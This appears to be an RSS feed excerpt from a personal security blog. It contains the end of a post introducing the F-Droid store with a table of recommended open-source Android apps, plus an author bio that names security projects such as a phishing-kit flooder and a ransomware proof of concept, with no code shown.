&lt;p&gt;If you are interested in the building and signing process of the apps, you can find some details in the &lt;a href=&#34;https://f-droid.org/en/docs/FAQ_-_General&#34;&gt;FAQ section on f-droid.org&lt;/a&gt; or in the documentation about the &lt;a href=&#34;https://f-droid.org/en/docs/Security_Model/&#34;&gt;security model&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;how-to-install-f-droid&#34;&gt;How to install F-Droid?&lt;/h2&gt;
&lt;p&gt;Due to its FOSS nature, F-Droid cannot be found in the Google Play store. This means that it has to be downloaded and installed manually.
You can find the app on the &lt;a href=&#34;https://f-droid.org/en/&#34;&gt;f-droid website&lt;/a&gt;, but, in order to install it, you should allow your browser to &amp;lsquo;&lt;em&gt;install apps from unknown sources&lt;/em&gt;&amp;rsquo; directly from the Android settings. This should also be enabled for F-Droid itself, in order to download and install apps from it.&lt;/p&gt;
&lt;p&gt;A suggestion: disable this special permission for your browser as soon as the F-Droid installation is completed, because it creates a security risk for your device.&lt;/p&gt;
&lt;h2 id=&#34;my-favorite-foss-apps&#34;&gt;My favorite FOSS apps&lt;/h2&gt;
&lt;p&gt;Here is a list of my favorite &lt;em&gt;FOSS&lt;/em&gt; Android apps. Keep in mind that some of them can be found also on the Google Play store.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Name&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;strong&gt;On Google Play?&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Code&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;AdAway&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;No&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;AdBlocking&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Ad blocker that uses the hosts file. It requires root privileges, if you don&amp;rsquo;t have it, check &lt;a href=&#34;blokada.org&#34;&gt;Blokada&lt;/a&gt; instead.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/AdAway/AdAway&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Aegis&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.beemdevelopment.aegis&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2FA token&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Free, secure and open source app to manage your 2-step verification tokens.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/beemdevelopment/Aegis&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;AntennaPod&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=de.danoeh.antennapod&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Podcast&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Download, stream or queue episodes with tons of features. Millions of free and paid podcasts available.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/antennapod/AntennaPod&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Flym&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=net.frju.flym&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;RSS&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Simple and modern RSS reader; fetches your websites/blogs and displaying them in a mobile-optimized way.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/FredJul/Flym&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Gadgetbridge&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.kunzisoft.keepass.free&#34;&gt;Yes (early access)&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Wearables&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Communicate with wearables (MiBand/Pebble/Amazfit) without creating an account. Many features available depending on the device.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://codeberg.org/Freeyourgadget/Gadgetbridge/&#34;&gt;Codeberg&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;KeepassDX&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=ee.aegrel.gadgetbridge&#34;&gt;Yes (early access)&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Password manager&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Keepass compatible password manager. If you don&amp;rsquo;t use a password manager, make yourself a favor and start using it.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/Kunzisoft/KeePassDX&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Kore&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=org.xbmc.kore&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Kodi remote&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;A simple, easy to use and beautiful remote that lets you control your Kodi/XBMC media center from your Android device.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/xbmc/Kore&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;KISS launcher&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=fr.neamar.kiss&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Launcher&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Easy to use and extremely lightweight Android launcher.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/Neamar/KISS&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Material Files&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=me.zhanghai.android.files&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;File manager&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;An open source Material Design file manager, for Android 5.0+.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/zhanghai/MaterialFiles&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;NewPipe&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;No&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;YouTube (&amp;amp; more)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Youtube client that allows audio only playback in background and download. No Google account needed.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/TeamNewPipe/NewPipe&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Scarlet Notes&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.bijoysingh.quicknote&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Notes&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Simple and no hassle interface for adding notes in a beautiful material design.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/BijoySingh/Material-Notes-Android-App&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Slide&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=me.ccrama.redditslide&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Reddit&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Fully feature unofficial Reddit browser. Ad-free, easy to use, multiple account support and TONS of customizations.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/ccrama/Slide&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Termux&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.termux&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Terminal emulator&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Terminal emulator with Linux package collection: bash and zsh, nano and vim, ssh, python, gdb and more.. on your phone!&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/tmux/tmux&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Vanilla Music&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=ch.blinkenlights.android.vanilla&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Music&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Clean and simple music player. Support for all common audio formats, tag based and folder based navigation.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/vanilla-music/vanilla&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;strong&gt;Voice&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=de.ph1b.audiobook&#34;&gt;Yes&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Audiobooks&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Audiobook player which remembers last position, has bookmarks, Android Auto compatibility and Sleep-timer.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://github.com/PaulWoitaschek/Voice&#34;&gt;GitHub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is only a brief introduction to the F-Droid world. Next time you are looking for an app, remember to check first if a FOSS alternative exists. Even if you don&amp;rsquo;t want to install the F-Droid client, maybe you could find it on the Play Store: you will receive in return less ads on your phone and a more privacy friendly experience.&lt;/p&gt;
&lt;p&gt;Before installing the app, always check when was the last update. Outdated apps may expose you to security issues (this is a suggestion that applies also when installing apps from the Play Store).&lt;/p&gt;
&lt;h1 id=&#34;sources&#34;&gt;Sources&lt;/h1&gt;
&lt;p&gt;If you are interested in this topic, you can check:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://f-droid.org/en/&#34;&gt;fdroid.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/fdroid/&#34;&gt;r/fdroid on Reddit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/fossdroid/&#34;&gt;r/fossdroid on Reddit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://fossdroid.com/&#34;&gt;fossdroid.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Hey 👋</title>
      <link>/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/about/</guid>
      <description>&lt;p&gt;My name is &lt;strong&gt;Andrea Palmieri&lt;/strong&gt;. I am interested in everything cyber-security related, machine learning, and reverse engineering. I am passionate about books, movies and art in general. Also, I am a die-hard AS Roma fan.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;/AndreaPalmieriCV.pdf&#34;&gt;Here&lt;/a&gt; is a &lt;strong&gt;non-updated&lt;/strong&gt; version of my resume. For a more recent version, you can send me an email at &lt;em&gt;andpalmier [at] gmail [dot] com&lt;/em&gt; or contact me on &lt;a href=&#34;https://www.linkedin.com/in/andreapalmieri95&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;projects&#34;&gt;Projects&lt;/h3&gt;
&lt;p&gt;You can find my projects on &lt;a href=&#34;https://github.com/andpalmier/&#34;&gt;GitHub&lt;/a&gt;, here are some of the most interesting ones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;makephish&lt;/strong&gt;: clone and patch websites to create phishing pages. &lt;a href=&#34;https://github.com/andpalmier/phishflood&#34;&gt;GitHub&lt;/a&gt; and a &lt;a href=&#34;https://esgeeks.com/makephish-clonar-sitios-web-login/&#34;&gt;spanish article about it&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;apkingo&lt;/strong&gt;: get detailed information about apk files. &lt;a href=&#34;https://github.com/andpalmier/apkingo&#34;&gt;GitHub&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;phishflood&lt;/strong&gt;: flood phishing kits with fake data. &lt;a href=&#34;https://andpalmier.com/posts/flooding-phishing-kits/&#34;&gt;Blog post&lt;/a&gt; and &lt;a href=&#34;https://github.com/andpalmier/phishflood&#34;&gt;GitHub&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;goransom&lt;/strong&gt;:  poc for a simple ransomware in Go. &lt;a href=&#34;https://andpalmier.com/posts/poc-goransom/&#34;&gt;Blog post&lt;/a&gt; and &lt;a href=&#34;https://github.com/andpalmier/goransom/&#34;&gt;GitHub&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;mlWithPhishing&lt;/strong&gt;: tuning machine learning models for phishing detection. &lt;a href=&#34;https://andpalmier.github.io/tags/machine-learning/&#34;&gt;Blog posts&lt;/a&gt; and &lt;a href=&#34;https://github.com/andpalmier/MLWithPhishing&#34;&gt;GitHub&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MQTTSA&lt;/strong&gt;: detect misconfigurations in MQTT brokers and suggest mitigations. &lt;a href=&#34;https://ieeexplore.ieee.org/document/8817102&#34;&gt;IEEEXplore&lt;/a&gt;, &lt;a href=&#34;https://github.com/stfbk/mqttsa&#34;&gt;GitHub&lt;/a&gt; and &lt;a href=&#34;https://sites.google.com/fbk.eu/mqttsa&#34;&gt;website&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>
